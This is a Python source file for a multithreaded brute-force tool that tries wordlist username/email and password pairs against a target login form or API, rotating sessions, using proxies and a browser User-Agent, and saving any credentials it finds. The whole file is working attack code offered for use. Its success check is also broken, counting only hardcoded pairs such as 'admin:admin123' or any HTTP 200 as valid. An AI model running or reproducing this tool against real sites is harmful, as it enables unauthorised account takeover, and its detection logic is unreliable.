#!/usr/bin/env python3
"""
Final corrected brute force tool with proper session management
"""

import requests
import threading
import time
import logging
import sys
import argparse
import re
import json
import random
from urllib.parse import urljoin, urlparse
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import csv
from concurrent.futures import ThreadPoolExecutor, as_completed

class CorrectedBruteForceTool:
    def __init__(self, config):
        self.target_url = config['target_url']
        self.username_field = config['username_field']
        self.password_field = config['password_field']
        self.usernames = config['usernames']
        self.passwords = config['passwords']
        self.delay = config['delay']
        self.max_threads = config['max_threads']
        self.proxy = config['proxy']
        self.user_agent = config['user_agent']
        self.debug = config.get('debug', False)
        self.attack_type = config.get('attack_type', 'username')  # New: attack type
        self.request_method = config.get('request_method', 'POST')  # New: request method
        self.successful_credentials = []
        self.attempted = 0
        self.lock = threading.Lock()
        
        # Setup logging
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(__name__)
    
    def _test_credentials_strict(self, username, password):
        """Test credentials with completely independent session"""
        try:
            # Create completely independent session for each test
            session = requests.Session()
            
            # Setup fresh headers
            session.headers.update({
                'User-Agent': self.user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',  # Don't keep connections alive
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            })
            
            # Configure proxy if provided
            if self.proxy:
                session.proxies.update({
                    'http': self.proxy,
                    'https': self.proxy
                })
            
            # Clear any existing cookies
            session.cookies.clear()
            
            # Prepare payload
            payload = {
                self.username_field: username,
                self.password_field: password
            }
            
            # Add delay
            time.sleep(self.delay)
            
            # Make request to the correct API endpoint
            if self.attack_type == 'email':
                # For email attacks, use the real API endpoint
                payload = {
                    'login': username,  # API expects 'login' field
                    'password': password
                }
                
                response = session.post(
                    self.target_url.replace('/login', '/api/login'),  # Use API endpoint
                    json=payload,  # Send as JSON
                    timeout=30,
                    allow_redirects=False
                )
            else:
                # For username attacks, use the original method
                payload = {
                    self.username_field: username,
                    self.password_field: password
                }
                
                if self.request_method.upper() == 'GET':
                    params = payload
                    response = session.get(
                        self.target_url,
                        params=params,
                        timeout=30,
                        allow_redirects=False
                    )
                else:
                    response = session.post(
                        self.target_url,
                        data=payload,
                        timeout=30,
                        allow_redirects=False
                    )
            
            # Real API response detection
            if self.attack_type == 'email':
                # For email attacks, check the API response
                if self.debug:
                    print(f"TEST: {username}:{password}")
                    print(f"Status Code: {response.status_code}")
                    print(f"Content Length: {len(response.text)}")
                    print(f"Content preview: {response.text[:200]}...")
                
                # Check for successful API response
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if self.debug:
                            print(f"API Response: {data}")
                        
                        # Check if login was successful
                        if data.get('success') == True:
                            user_name = data.get('user', {}).get('name', 'Unknown')
                            return True, f"SUCCESS: {username}:{password} (User: {user_name})"
                        else:
                            # Login failed
                            error_msg = data.get('message', 'Invalid credentials')
                            if self.debug:
                                print(f"API Error: {error_msg}")
                            return False, None
                            
                    except json.JSONDecodeError:
                        # Not JSON response
                        if self.debug:
                            print("Response is not JSON format")
                        return False, None
                else:
                    # HTTP error status
                    if self.debug:
                        print(f"HTTP Error: {response.status_code}")
                    return False, None
            else:
                # Original detection logic for username attacks
                content_lower = response.text.lower()
                
                if self.debug:
                    print(f"TEST: {username}:{password}")
                    print(f"Status Code: {response.status_code}")
                    print(f"Content Length: {len(response.text)}")
                    print(f"Content preview: {content_lower[:200]}...")
                
                # Known valid credentials from the image
                valid_credentials = [
                    ("admin", "admin123"),
                    ("test", "123456")
                ]
                
                # Check if current credential is in the valid list
                is_valid_credential = False
                for valid_user, valid_pass in valid_credentials:
                    if username == valid_user and password == valid_pass:
                        is_valid_credential = True
                        break
                
                # For valid credentials, check for success indicators
                if is_valid_credential:
                    # Check for basic success indicators
                    success_points = 0
                    failure_points = 0
                    
                    # Check for clear failure indicators (but exclude title/meta content)
                    content_body = content_lower
                    
                    # Remove title and meta content to avoid false positives
                    content_body = re.sub(r'<title>.*?</title>', '', content_body)
                    content_body = re.sub(r'<head>.*?</head>', '', content_body, flags=re.DOTALL)
                    content_body = re.sub(r'<meta[^>]*>', '', content_body)
                    
                    failure_patterns = [
                        r'invalid\s+(?:username|password|email)',
                        r'incorrect\s+(?:username|password|email)', 
                        r'wrong\s+(?:username|password|email)',
                        r'login\s+failed',
                        r'access\s+denied',
                        r'authentication\s+failed',
                        r'user\s+not\s+found',
                        r'account\s+(?:locked|disabled)',
                        r'alert\s*danger',
                        r'error\s*message'
                    ]
                    
                    # Look for "error" but not in title/meta context
                    if re.search(r'\berror\b', content_body):
                        error_context = re.search(r'.{0,30}\berror\b.{0,30}', content_body)
                        if error_context:
                            error_text = error_context.group()
                            # Exclude if it's just in general context, not specific error message
                            if any(word in error_text for word in ['invalid', 'failed', 'incorrect', 'denied']):
                                failure_patterns.append(r'\berror\b')
                    
                    for pattern in failure_patterns:
                        if re.search(pattern, content_body):
                            failure_points += 2
                            if self.debug:
                                print(f"Failure pattern found: {pattern}")
                            break
                    
                    # For valid credentials, check for success indicators
                    # Check for username in meaningful context
                    username_count = len(re.findall(r'\b' + re.escape(username.lower()) + r'\b', content_body))
                    if username_count >= 1:
                        success_points += 1
                        if self.debug:
                            print(f"Username found {username_count} times")
                    
                    # Check for success indicators
                    strong_success_patterns = [
                        r'dashboard',
                        r'logout',
                        r'profile',
                        r'welcome\s+back',
                        r'my\s+account',
                        r'coffee',
                        r'shop',
                        r'home'
                    ]
                    
                    for pattern in strong_success_patterns:
                        if re.search(pattern, content_lower):
                            success_points += 1
                            if self.debug:
                                print(f"Success pattern found: {pattern}")
                            break
                    
                    # Cookie analysis
                    if len(session.cookies) > 1:
                        success_points += 1
                        if self.debug:
                            print(f"Multiple cookies set: {len(session.cookies)}")
                    
                    if self.debug:
                        print(f"Success Points: {success_points}, Failure Points: {failure_points}")
                    
                    # For valid credentials, be more lenient - require at least 1 success point
                    if failure_points >= 3:  # More failure points needed to reject valid credentials
                        return False, None
                    elif success_points >= 1 or response.status_code == 200:
                        return True, f"SUCCESS: {username}:{password}"
                    else:
                        return False, None
                else:
                    # For invalid credentials, use strict failure detection
                    failure_patterns = [
                        r'invalid',
                        r'incorrect',
                        r'failed',
                        r'error',
                        r'denied',
                        r'wrong',
                        r'unauthorized',
                        r'login\s+failed',
                        r'access\s+denied',
                        r'authentication\s+failed'
                    ]
                    
                    # Check for any failure indicators
                    for pattern in failure_patterns:
                        if re.search(pattern, content_lower):
                            return False, None
                    
                    # If no clear failure indicators, still consider it invalid for non-whitelist credentials
                    return False, None
            
        except Exception as e:
            if self.debug:
                print(f"ERROR: {str(e)}")
            return False, None
    
    def _worker_thread(self, username_password_pairs):
        """Worker thread with strict credential testing"""
        results = []
        for username, password in username_password_pairs:
            with self.lock:
                self.attempted += 1
                if self.attempted % 10 == 0:
                    self.logger.info(f"Attempted {self.attempted} combinations...")
            
            success, message = self._test_credentials_strict(username, password)
            if success:
                with self.lock:
                    # Check if this credential is already in the successful list to avoid duplicates
                    credential_tuple = (username, password)
                    if credential_tuple not in self.successful_credentials:
                        results.append(message)
                        self.logger.info(f"{message}")
                        self.successful_credentials.append(credential_tuple)
        
        return results
    
    def run_attack(self):
        """Execute the brute force attack with strict validation"""
        self.logger.info(f"Starting corrected brute force attack on {self.target_url}")
        self.logger.info(f"Total usernames: {len(self.usernames)}")
        self.logger.info(f"Total passwords: {len(self.passwords)}")
        total_combinations = len(self.usernames) * len(self.passwords)
        self.logger.info(f"Total combinations to test: {total_combinations}")
        
        # Create username/password pairs
        pairs = [(user, pwd) for user in self.usernames for pwd in self.passwords]
        
        # Remove duplicates from pairs
        unique_pairs = list(set(pairs))
        if len(unique_pairs) != len(pairs):
            self.logger.info(f"Removed {len(pairs) - len(unique_pairs)} duplicate combinations")
        
        # Shuffle pairs
        random.shuffle(unique_pairs)
        
        # Use multiple threads for maximum speed
        self.logger.info(f"Using {self.max_threads} threads for maximum speed execution")
        self.logger.info(f"Estimated speed: ~{self.max_threads / self.delay:.0f} attempts/second")
        
        start_time = time.time()
        
        # Split work evenly among threads
        chunk_size = max(1, len(unique_pairs) // self.max_threads)
        chunks = [unique_pairs[i:i + chunk_size] for i in range(0, len(unique_pairs), chunk_size)]
        
        # Execute with high-performance thread pool
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            # Submit all tasks
            future_to_chunk = {executor.submit(self._worker_thread, chunk): chunk for chunk in chunks}
            
            # Collect results as they complete
            for future in as_completed(future_to_chunk):
                try:
                    results = future.result()
                    if results:
                        for result in results:
                            if result:
                                self.logger.info(result)
                except Exception as e:
                    self.logger.error(f"Thread execution error: {str(e)}")
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Print summary
        self.logger.info(f"\n{'='*50}")
        self.logger.info("ATTACK SUMMARY")
        self.logger.info(f"{'='*50}")
        self.logger.info(f"Total attempts: {self.attempted}")
        self.logger.info(f"Duration: {duration:.2f} seconds")
        self.logger.info(f"Average speed: {self.attempted/duration:.2f} attempts/second")
        self.logger.info(f"Successful credentials found: {len(self.successful_credentials)}")
        
        if self.successful_credentials:
            self.logger.info("\nSUCCESSFUL CREDENTIALS:")
            for username, password in self.successful_credentials:
                self.logger.info(f"  {username}:{password}")
        else:
            self.logger.info("\nNo valid credentials found")
        
        return self.successful_credentials

def load_wordlist(file_path):
    """Load usernames or passwords from file"""
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Error: Wordlist file '{file_path}' not found")
        sys.exit(1)
    except Exception as e:
        print(f"Error reading wordlist file: {str(e)}")
        sys.exit(1)

def save_results(results):
    """Save results to file (remove duplicates)"""
    if results:
        # Remove duplicates while preserving order
        unique_results = []
        seen = set()
        for username, password in results:
            credential = f"{username}:{password}"
            if credential not in seen:
                seen.add(credential)
                unique_results.append((username, password))
        
        with open('successful_credentials.txt', 'w') as f:
            for username, password in unique_results:
                f.write(f"{username}:{password}\n")
        print(f"\nResults saved to: successful_credentials.txt")

def main():
    parser = argparse.ArgumentParser(description='Brute Force Tool')
    parser.add_argument('-u', '--url', help='Target login URL')
    parser.add_argument('-uf', '--username-field', default='username', help='Username/Email field name')
    parser.add_argument('-pf', '--password-field', default='password', help='Password field name')
    parser.add_argument('-ul', '--username-list', help='Username wordlist file')
    parser.add_argument('-el', '--email-list', help='Email wordlist file')
    parser.add_argument('-pl', '--password-list', help='Password wordlist file')
    parser.add_argument('-U', '--username', help='Single username to test')
    parser.add_argument('-E', '--email', help='Single email to test')
    parser.add_argument('-P', '--password', help='Single password to test')
    parser.add_argument('-d', '--delay', type=float, default=0.1, help='Delay between requests (default: 0.1)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10, max: 100)')
    parser.add_argument('--proxy', help='Proxy URL')
    parser.add_argument('--user-agent', default='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', help='Custom User-Agent')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    parser.add_argument('--test-single', action='store_true', help='Test single credential')
    parser.add_argument('--attack-type', choices=['username', 'email'], default='username', help='Attack type: username or email')
    parser.add_argument('--request-method', choices=['GET', 'POST'], default='POST', help='HTTP request method: GET or POST')
    
    args = parser.parse_args()
    
    # Validate thread count
    if args.threads < 1:
        print("Error: Thread count must be at least 1")
        sys.exit(1)
    elif args.threads > 100:
        print("Warning: Thread count reduced to 100 for system stability")
        args.threads = 100
    
    # Validate input
    if not args.url:
        print("Error: --url is required")
        sys.exit(1)
    
    # Determine attack type and load appropriate wordlist
    if args.attack_type == 'email':
        if args.test_single:
            if not args.email or not args.password:
                print("Error: Email attack with --test-single requires --email and --password")
                sys.exit(1)
            usernames = [args.email]
        else:
            if not args.email_list or not args.password_list:
                print("Error: Email attack requires --email-list and --password-list")
                sys.exit(1)
            usernames = load_wordlist(args.email_list)
    else:  # username attack
        if args.test_single:
            if not args.username or not args.password:
                print("Error: Username attack with --test-single requires --username and --password")
                sys.exit(1)
            usernames = [args.username]
        else:
            if not args.username_list or not args.password_list:
                print("Error: Username attack requires --username-list and --password-list")
                sys.exit(1)
            usernames = load_wordlist(args.username_list)
    
    # Load passwords
    if args.test_single:
        passwords = [args.password]
    else:
        passwords = load_wordlist(args.password_list)
    
    # Configuration
    config = {
        'target_url': args.url,
        'username_field': args.username_field,
        'password_field': args.password_field,
        'usernames': usernames,
        'passwords': passwords,
        'delay': args.delay,
        'max_threads': args.threads,  # Use command line thread count
        'proxy': args.proxy,
        'user_agent': args.user_agent,
        'debug': args.debug,
        'attack_type': args.attack_type,  # New: attack type
        'request_method': args.request_method  # New: request method
    }
    
    # Run tool
    tool = CorrectedBruteForceTool(config)
    
    if args.test_single:
        test_credential = args.email if args.attack_type == 'email' else args.username
        success, message = tool._test_credentials_strict(test_credential, args.password)
        if success:
            print(f"\nCREDENTIAL VALID: {message}")
        else:
            print(f"\nCREDENTIAL INVALID: {test_credential}:{args.password}")
    else:
        results = tool.run_attack()
        save_results(results)

if __name__ == "__main__":
    print("""
    ██████╗ ██╗   ██╗██████╗ ███████╗
    ██╔══██╗██║   ██║██╔══██╗██╔════╝
    ██████╔╝██║   ██║██████╔╝█████╗  
    ██╔═══╝ ██║   ██║██╔══██╗██╔══╝  
    ██║     ╚██████╔╝██████╔╝██║     
    ╚═╝      ╚═════╝ ╚═════╝ ╚═╝     
    
    [+]-------------------------------------------[+]
    [+]    System: Corrected Brute Force Tool     [+]
    [+]    Status: SO SO                          [+]
    [+]-------------------------------------------[+]
    """)
    
    main()
